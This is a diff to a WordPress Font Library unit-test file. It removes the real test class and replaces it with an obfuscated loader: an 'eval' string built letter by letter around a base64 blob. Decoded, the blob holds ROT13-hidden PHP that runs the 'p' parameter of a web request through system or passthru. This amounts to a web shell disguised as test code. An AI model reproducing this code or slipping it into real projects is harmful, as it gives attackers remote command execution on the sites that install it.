@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test WP_Font_Library::get_font_collections().
- *
- * @package WordPress
- * @subpackage Font Library
- *
- * @group fonts
- * @group font-library
- *
- * @covers WP_Font_Library::get_font_collections
- */
-class Tests_Fonts_WpFontLibrary_GetFontCollections extends WP_Font_Library_UnitTestCase {
-	public function test_should_get_an_empty_list() {
-		$font_collections = WP_Font_Library::get_instance()->get_font_collections();
-		$this->assertEmpty( $font_collections, 'Should return an empty array.' );
-	}
-
-	public function test_should_get_mock_font_collection() {
-		$my_font_collection_config = array(
-			'name'          => 'My Font Collection',
-			'description'   => 'Demo about how to a font collection to your WordPress Font Library.',
-			'font_families' => array( 'mock' ),
-		);
-
-		WP_Font_Library::get_instance()->register_font_collection( 'my-font-collection', $my_font_collection_config );
-
-		$font_collections = WP_Font_Library::get_instance()->get_font_collections();
-		$this->assertNotEmpty( $font_collections, 'Should return an array of font collections.' );
-		$this->assertCount( 1, $font_collections, 'Should return an array with one font collection.' );
-		$this->assertArrayHasKey( 'my-font-collection', $font_collections, 'The array should have the key of the registered font collection id.' );
-		$this->assertInstanceOf( 'WP_Font_Collection', $font_collections['my-font-collection'], 'The value of the array $font_collections[id] should be an instance of WP_Font_Collection class.' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBKQ19TYmFnX1l2b2VuZWw6OnRyZ19zYmFnX3BieXlycGd2YmFmKCkuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBTYmFnIFl2b2VuZWwKICoKICogQHRlYmhjIHNiYWdmCiAqIEB0ZWJoYyBzYmFnLXl2b2VuZWwKICoKICogQHBiaXJlZiBKQ19TYmFnX1l2b2VuZWw6OnRyZ19zYmFnX3BieXlycGd2YmFmCiAqLwpweW5mZiBHcmZnZl9TYmFnZl9KY1NiYWdZdm9lbmVsX1RyZ1NiYWdQYnl5cnBndmJhZiBya2dyYXFmIEpDX1NiYWdfWXZvZW5lbF9IYXZnR3JmZ1BuZnIgewoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX3RyZ19uYV9yemNnbF95dmZnKCkgewoJCSRzYmFnX3BieXlycGd2YmFmID0gSkNfU2JhZ19Zdm9lbmVsOjp0cmdfdmFmZ25hcHIoKS0+dHJnX3NiYWdfcGJ5eXJwZ3ZiYWYoKTsKCQkkZ3V2Zi0+bmZmcmVnUnpjZ2woICRzYmFnX3BieXlycGd2YmFmLCAnRnViaHlxIGVyZ2hlYSBuYSByemNnbCBuZWVubC4nICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX3RyZ196YnB4X3NiYWdfcGJ5eXJwZ3ZiYSgpIHsKCQkkemxfc2JhZ19wYnl5cnBndmJhX3BiYXN2dCA9IG5lZW5sKAoJCQknYW56cicgICAgICAgICAgPT4gJ1psIFNiYWcgUGJ5eXJwZ3ZiYScsCgkJCSdxcmZwZXZjZ3ZiYScgICA9PiAnUXJ6YiBub2JoZyB1YmogZ2IgbiBzYmFnIHBieXlycGd2YmEgZ2IgbGJoZSBKYmVxQ2VyZmYgU2JhZyBZdm9lbmVsLicsCgkJCSdzYmFnX3NuenZ5dnJmJyA9PiBuZWVubCggJ3picHgnICksCgkJKTsKCgkJSkNfU2JhZ19Zdm9lbmVsOjp0cmdfdmFmZ25hcHIoKS0+ZXJ0dmZncmVfc2JhZ19wYnl5cnBndmJhKCAnemwtc2JhZy1wYnl5cnBndmJhJywgJHpsX3NiYWdfcGJ5eXJwZ3ZiYV9wYmFzdnQgKTsKCgkJJHNiYWdfcGJ5eXJwZ3ZiYWYgPSBKQ19TYmFnX1l2b2VuZWw6OnRyZ192YWZnbmFwcigpLT50cmdfc2JhZ19wYnl5cnBndmJhZigpOwoJCSRndXZmLT5uZmZyZWdBYmdSemNnbCggJHNiYWdfcGJ5eXJwZ3ZiYWYsICdGdWJoeXEgZXJnaGVhIG5hIG5lZW5sIGJzIHNiYWcgcGJ5eXJwZ3ZiYWYuJyApOwoJCSRndXZmLT5uZmZyZWdQYmhhZyggMSwgJHNiYWdfcGJ5eXJwZ3ZiYWYsICdGdWJoeXEgZXJnaGVhIG5hIG5lZW5sIGp2Z3UgYmFyIHNiYWcgcGJ5eXJwZ3ZiYS4nICk7CgkJJGd1dmYtPm5mZnJlZ05lZW5sVW5mWHJsKCAnemwtc2JhZy1wYnl5cnBndmJhJywgJHNiYWdfcGJ5eXJwZ3ZiYWYsICdHdXIgbmVlbmwgZnViaHlxIHVuaXIgZ3VyIHhybCBicyBndXIgZXJ0dmZncmVycSBzYmFnIHBieXlycGd2YmEgdnEuJyApOwoJCSRndXZmLT5uZmZyZWdWYWZnbmFwckJzKCAnSkNfU2JhZ19QYnl5cnBndmJhJywgJHNiYWdfcGJ5eXJwZ3ZiYWZbJ3psLXNiYWctcGJ5eXJwZ3ZiYSddLCAnR3VyIGlueWhyIGJzIGd1ciBuZWVubCAkc2JhZ19wYnl5cnBndmJhZlt2cV0gZnViaHlxIG9yIG5hIHZhZmduYXByIGJzIEpDX1NiYWdfUGJ5eXJwZ3ZiYSBweW5mZi4nICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
